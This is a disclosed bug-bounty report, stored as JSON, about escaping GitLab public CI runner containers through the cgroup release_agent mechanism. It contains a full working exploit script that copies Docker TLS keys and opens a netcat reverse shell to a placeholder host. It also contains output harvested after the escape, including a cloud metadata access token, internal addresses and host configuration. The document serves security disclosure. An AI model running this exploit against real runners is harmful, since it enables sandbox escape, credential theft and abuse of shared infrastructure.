{
  "id": 1442118,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQyMTE4",
  "url": "https://hackerone.com/reports/1442118",
  "title": "Container escape on public GitLab CI runners",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "high",
  "readable_substate": "Informative",
  "created_at": "2022-01-06T00:29:40.687Z",
  "submitted_at": "2022-01-06T00:29:40.807Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ec0",
    "url": "/ec0",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/g0sjftyewyu9pa2c0a3e3z39mon3/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22IMG_2903_tech_512.png%22%3B%20filename%2A%3DUTF-8%27%27IMG_2903_tech_512.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142126Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aba084141818965b9574e05f2c32423575174fe7ac445ef6c68d7d4dace38171"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-04-27T11:12:25.142Z",
  "bug_reporter_agreed_on_going_public_at": "2022-04-14T01:33:01.533Z",
  "team_member_agreed_on_going_public_at": "2022-04-27T11:12:25.033Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nIt is possible to circumvent the isolation in place for build jobs running on public CI runners by escaping the docker container running the build job.\nThis is possible via abuse of the cgroup release_agent functionality, made possible by CI jobs being allowed to mount filesystems inside the container.\n\nFrom this host, I was able to spawn a root remote shell and run whatever I liked without restriction, including bypassing the iptables rules put in place to prevent access to the GCP metadata API. I was also able to gather sensitive data such as the instance token, GCP project ID and instance configuration, docker host TLS keys, firewall details, suricata configuration and user account names for the ops team, which could aid in further exploitation for a motivated attacker.\n\n### Steps to reproduce\n\n1. Sign up for a regular, free GitLab account.\n2. Create a new project.\n     An example repo is here: https://gitlab.com/ec0bb/citest (made private)\n3. Add the below `.gitlab-ci.yaml`\n```\nimage: python:latest\nrun:\n  script:\n    - bash shell.sh\n```\n4. Add the below `shell.sh`\n```\nexport HOST=your.reverse.shell.box # customise this!\n\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nexport host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\n\ntouch /user/txt\ntouch /ca.pem\ntouch /server.pem\ntouch /server-key.pem\ntouch /ps.txt\necho '#!/bin/sh' > /cmd\necho \"whoami > $host_path/user.txt\" >> /cmd\necho \"ps uax > $host_path/ps.txt\" >> /cmd\necho \"cat /etc/docker/ca.pem > $host_path/ca.pem\" >> /cmd\necho \"cat /etc/docker/server.pem > $host_path/server.pem\" >> /cmd\necho \"cat /etc/docker/server-key.pem > $host_path/server-key.pem\" >> /cmd\necho \"mount -o bind /var/run/docker.sock $host_path/docker.sock\" >> /cmd\necho \"/usr/bin/nc $HOST 1337 -e /bin/sh &\" >> /cmd\nchmod a+x /cmd\n\nwhile test 1\ndo\n  sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n  sleep 60\ndone\n```\n5. Push the files to the repository.\n6. Enable CI/CD jobs on the repository, in case they aren't, using the `.gitlab-ci.yml` in the repository.\n7. Set up a reverse shell listener with `nc -lvp 1337` on the host you specified in the bash script above.\n8. Run the job\n\n### Impact\n\nBased on the host configuration, there is a clear expectation that CI jobs should not have access to the host, given the use of $DOCKER_USER in the firewall rules, and the configuration in place to prevent access to GCP metadata and host configuration in the way the container is configured. \n\nBeing able to break this confinement allows for unconstrained resource usage on the CI host, as well as access to GCP resources and also other hosts on the internal GCP network.  It is also possible to disable iptables and suricata entirely - so arbitrary software and docker images can also be downloaded and run, to facilitate things like cryptocoin mining, something the host has been configured to try and prevent via iptables and suricata rules. This could be used by an attacker to consume significant compute resources in the form of bandwidth usage and compute time, given how easy it is to spin up multiple GitLab accounts, and to restart jobs programmatically when the maximum execution time is reached.\n\nI did not see any evidence of shared jobs in my testing, however if multiple jobs were scheduled on a dedicated runner (which I did not test) then this could also lead to a loss of confidentiality between jobs, as the full container configuration and contents are accessible once the container is escaped.\n\n### Examples\n\nRepo: https://gitlab.com/ec0bb/citest\n\nGCP access (albeit limited) -\n```\ncurl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n{\"access_token\":\"ya29.c.b0AXv0zTPHcDsuE3JOIVaFex7mGac13DuX3nI8XvoeSTANd0HfWmJ8BaTiE0P8GGRBVjOH3--Bangi4UVHqBpR7hLsfielnvZd5VWsRVM9xedCsFchJ1VlIl_RHRAgndu79QhAdEtquGQ9FVw8K_v-beS5zXMSh2DZNEfrUx6IgkAF3skn2sAkxg89XQm5gm067YQIAoaPlyI\",\"expires_in\":3326,\"token_type\":\"Bearer\"}\n\nya29.c.b0AXv0zTO_ny6xsfw0m5_YDMjdRUJbxx4jtnhEvrHEBghVmwDPL8GYx8UEQyB2spVmqtEy4IO_1kIONyCny-qwV7bi32okDSc8eNSTwXDUynLVayT3O0OiQ_FOCBlIMaU8Afx_Cbnr3xM7okiaMie0OWkRt4rHnYakWzXUZ_skTaLtN75GASDhs-mqFBe2LPFhj58eGf7DnFNk\ntoken bb\n\n\n\n\ninstance/attributes/cos-update-strategy update_disabled\ninstance/attributes/sshKeys cos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHZ9aaQ4+W\nhumgGQokzT+0zX+bS6AkSbs/JYeuoV8Sdb2cp88txEWoozuamR/S6MXp0lHF7hD2hmClvk5LESQLo9pe\nFWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/EXMLunbShenhpg05aby26wBHnBINU4ERITySAW362xT\nzovivE+RA+yWUcuZUzpGTAGOeSqJpH7Gg4g86jMof7IG0Ybixt6LgRhK8tX6ryUw8eqWaAPwB4W/nQ6T\nn2Eup21246PzVqMMhxo4O1dO2g7e2Jyqehvo7Yf5avc4kQ7h2LBrt033Esk1V5XFdzb++1kQxVkEUFor\nwID4cGmMb0Av cos\n\ninstance/attributes/user-data #cloud-config\n\nwrite_files:\n- path: /etc/systemd/system/docker.service.d/20-run-binfmt-container.conf\n  permissions: 0644\n  owner: root\n  content: |\n    [Service]\n    ExecStartPost=docker run --rm --privileged linuxkit/binfmt:v0.8\n\n- path: /etc/systemd/system/docker.service.d/05-iptables-restore-wants.conf\n  permissions: 0644\n  owner: root\n  content: |\n    [Unit]\n    Wants=network-online.target containerd.service iptables-restore.service\n:\n- path: /etc/systemd/system.conf\n  permissions: 0644\n  owner: root\n  content: |\n    [Manager]\n    # Defaults from Google Container Optimized OS\n    DefaultCPUAccounting=yes\n    DefaultBlockIOAccounting=yes\n    # Our custom timeout to speed-up VM shutdown\n    # see: https://gitlab.com/gitlab-com/gl-infra/infrastructure/-/issues/13826#\nnote_632590419\n    DefaultTimeoutStopSec=5s\n\n- path: /var/lib/cloud/scripts/per-boot/00-enable-swap\n  permissions: 0755\n  owner: root\n  content: |\n    #!/usr/bin/env sh\n\n    sysctl vm.disk_based_swap=1\n    fallocate -l 2G /var/swapfile\n    chmod 600 /var/swapfile\n    mkswap /var/swapfile\n    swapon /var/swapfile\n\n- path: /var/lib/cloud/scripts/per-boot/01-configure-custom-sysctl\n  permissions: 0755\n  owner: root\n  content: |\n    #!/usr/bin/env sh\n\n    # Required for Elasticsearch docker images to function:\n    # https://gitlab.com/gitlab-com/infrastructure/issues/1687\n    sysctl vm.max_map_count=262144\n\n    # Swap is available, but not preferred\n    sysctl vm.swappiness=10\n\ninstance/cpu-platform Intel Haswell\ninstance/description docker host vm\ninstance/disks/0/device-name persistent-disk-0\ninstance/disks/0/index 0\ninstance/disks/0/interface SCSI\ninstance/disks/0/mode READ_WRITE\ninstance/disks/0/type PERSISTENT\ninstance/hostname runner-jlguopmm-shared-1641423520-3feb5440.c.gitlab-ci-plan-fr\nee-6-f2de7a.internal\ninstance/id 8450900684160343118\ninstance/image projects/gitlab-ci-155816/global/images/runners-cos-stable-v20210\n720-0\ninstance/legacy-endpoint-access/0.1 0\ninstance/legacy-endpoint-access/v1beta1 0\ninstance/licenses/0/id 6880041984096540132\ninstance/licenses/1/id 1001010\ninstance/licenses/2/id 166739712233658766\ninstance/machine-type projects/745008255720/machineTypes/n1-standard-1\ninstance/maintenance-event NONE\ninstance/name runner-jlguopmm-shared-1641423520-3feb5440\ninstance/network-interfaces/0/access-configs/0/external-ip 35.185.3.50\ninstance/network-interfaces/0/access-configs/0/type ONE_TO_ONE_NAT\ninstance/network-interfaces/0/dns-servers 169.254.169.254\ninstance/network-interfaces/0/gateway 10.10.8.1\ninstance/network-interfaces/0/ip 10.10.10.75\ninstance/network-interfaces/0/mac 42:01:0a:0a:0a:4b\ninstance/network-interfaces/0/mtu 1460\ninstance/network-interfaces/0/network projects/745008255720/networks/ephemeral-r\nunners\ninstance/network-interfaces/0/subnetmask 255.255.248.0\ninstance/preempted FALSE\ninstance/remaining-cpu-time -1\ninstance/scheduling/automatic-restart TRUE\ninstance/scheduling/on-host-maintenance MIGRATE\ninstance/scheduling/preemptible FALSE\ninstance/service-accounts/default/aliases default\ninstance/service-accounts/default/email ephemeral-runner@gitlab-ci-plan-free-6-f\n2de7a.iam.gserviceaccount.com\ninstance/service-accounts/default/scopes https://www.googleapis.com/auth/logging\n.write\ninstance/service-accounts/default/scopes https://www.googleapis.com/auth/monitor\ning.write\ninstance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\nviceaccount.com/aliases default\ninstance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\nviceaccount.com/email ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gservice\naccount.com\ninstance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\nviceaccount.com/scopes https://www.googleapis.com/auth/logging.write\ninstance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser\nviceaccount.com/scopes https://www.googleapis.com/auth/monitoring.write\ninstance/tags docker-machine\ninstance/virtual-clock/drift-token 0\ninstance/zone projects/745008255720/zones/us-east1-c\nproject/attributes/disable-legacy-endpoints TRUE\nproject/attributes/serial-port-logging-enable false\nproject/numeric-project-id 745008255720\nproject/project-id gitlab-ci-plan-free-6-f2de7a\n\ncomputeMetadata/v1/instance/service-accounts/default/scopes \\  \n>     -H 'Metadata-Flavor:Google'\nhttps://www.googleapis.com/auth/logging.write\nhttps://www.googleapis.com/auth/monitoring.write\n```\n\ndocker access\n```\nroot@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps\nCONTAINER ID        IMAGE                                                      COMMAND                  CREATED             STATUS              PORTS               NAMES\na40074c0d2c5        a5d7930b60cc                                               \"sh -c 'if [ -x /usr…\"   25 minutes ago      Up 25 minutes                           runner-jlguopmm-project-27556964-concurrent-0-1abba63760b4a3af-build-2\n8c1dbc222094        quay.io/gitlab/gitlab-runner-docker-cleanup:latest         \"go-wrapper run\"         5 months ago        Up 26 minutes                           gitlab-runner-docker-cleanup\nfa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   \"/sbin/init\"             5 months ago        Up 26 minutes                           suricata\n17e19eb0ac0b        quay.io/prometheus/node-exporter:v1.0.1                    \"/bin/node_exporter …\"   5 months ago        Up 26 minutes                           node-exporter\n```\n\nrunner TLS keys for communicating with the runner manager (also used for logstash auth)\n```\nroot@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*\nrunner.ca.crt:     PEM certificate\nrunner.client.crt: PEM certificate\nrunner.client.key: PEM RSA private key\n```\n\n## Impact\n\nUnconfined remote code execution on CI host machines\nAccess to GCP API\nAccess to internal GCP network",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 11,
  "voters": [
    "mrmax4o4",
    "zy9ard3",
    "h4x0r_dz",
    "realvivek",
    "onorbayar",
    "shivammusic",
    "deensec",
    "j14n",
    "idlefire",
    "baddest_bitch12",
    "and 1 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
